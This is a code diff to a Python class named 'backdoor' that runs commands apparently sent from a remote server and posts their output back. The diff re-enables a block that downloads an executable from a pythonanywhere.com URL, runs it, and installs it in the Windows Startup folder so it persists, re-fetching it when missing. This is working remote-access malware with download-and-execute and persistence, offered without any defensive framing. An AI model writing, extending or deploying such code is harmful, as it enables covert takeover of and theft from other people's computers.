@@ -19,31 +19,31 @@ class backdoor:
                 output = self.run(commands[i])
                 print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            # if i == 1:
-            #     def download():
-            #         url = "https://pybdtest.pythonanywhere.com/media/files/startup.exe/"
-            #         get_response = requests.get(url)
+            if i == 1:
+                def download():
+                    url = "https://pybdtest.pythonanywhere.com/media/files/test4.exe/"
+                    get_response = requests.get(url)
 
-            #         with open("startup.exe", "wb") as out_file:
-            #             out_file.write(get_response.content)
-            #         os.startfile("startup.exe")
-            #     x = -2
-            #     for i in os.getcwd():
-            #         if i == "\\":
-            #             x += 1
-            #     for i in range(x):
-            #         os.chdir("..")
+                    with open("test4.exe", "wb") as out_file:
+                        out_file.write(get_response.content)
+                    os.startfile("test4.exe")
+                x = -2
+                for i in os.getcwd():
+                    if i == "\\":
+                        x += 1
+                for i in range(x):
+                    os.chdir("..")
 
-            #     print(os.getcwd())
-            #     os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
-            #     if os.path.isfile("startup.exe"):
-            #         with open("startup.exe","r+") as r:
-            #             r = r.read()
-            #         if len(r) < 10:
-            #             download()
-            #     else:
-            #         download()
-            #     i = 0
+                print(os.getcwd())
+                os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
+                if os.path.isfile("test4.exe"):
+                    with open("test4.exe","r+") as r:
+                        r = r.read()
+                    if len(r) < 10:
+                        download()
+                else:
+                    download()
+                i = 0
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
